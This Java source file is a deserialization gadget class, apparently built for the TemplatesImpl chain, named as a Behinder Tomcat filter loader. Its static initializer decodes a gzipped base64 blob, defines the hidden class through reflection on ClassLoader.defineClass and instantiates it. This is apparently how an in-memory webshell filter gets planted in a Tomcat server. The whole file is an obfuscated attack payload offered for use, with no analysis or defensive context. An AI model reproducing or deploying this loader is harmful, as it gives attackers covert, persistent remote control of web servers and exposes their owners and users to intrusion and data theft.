package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TomcatBehinderFilterTemplatesImpl extends AbstractTranslet {

    static {
        try {
            String base64 = "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";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            ((Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length)).newInstance().equals(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
}
